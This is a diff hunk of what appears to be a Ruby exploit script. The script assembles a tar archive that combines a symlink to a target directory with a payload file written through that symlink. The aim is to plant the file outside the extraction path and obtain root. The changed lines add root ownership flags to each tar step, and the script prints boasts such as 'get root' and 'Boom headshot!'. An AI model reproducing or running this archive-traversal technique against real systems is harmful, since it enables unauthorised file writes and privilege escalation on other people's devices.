@@ -299,18 +299,18 @@ if win == 1
     system("win32\\rm -rf symlink Burning0day.txt fireworks.tar")
     File.open("Burning0day.txt", 'a') {|f| f.write("\nget root... Thx for all the fish P0V\n") }
     puts "Creating the tar file"
-    system("win32\\tar -cvpf fireworks.tar Burning0day.txt")
+    system("win32\\tar -cvpf fireworks.tar --owner=root --group=root Burning0day.txt")
     puts "Making the symlinks" 
     system("win32\\ln -s " + destdir + " symlink")
     puts "Adding the fireworks..."
-    system("win32\\tar -r -f fireworks.tar symlink")
+    system("win32\\tar -r -f fireworks.tar --owner=root --group=root symlink")
     system("win32\\rm -rf symlink")
     system("win32\\mkdir symlink")
     # fuck we need chmod from Cygwin added to finish this. 
     File.open("symlink/" + destfile , 'w') {|f| f.write(nastyfile) }
 #    system("win32\\chmod 755 " + "symlink/" + destfile )  # Need to add chmod from cygwin... 
     puts "Boom headshot!"
-    system("win32\\tar -r -pf fireworks.tar symlink/" + destfile)
+    system("win32\\tar -r -pf fireworks.tar --owner=root --group=root symlink/" + destfile)
 else
     system("rm -rf symlink Burning0day.txt fireworks.tar")
     system("echo 'get root... Thx for all the fish P0V' > Burning0day.txt")
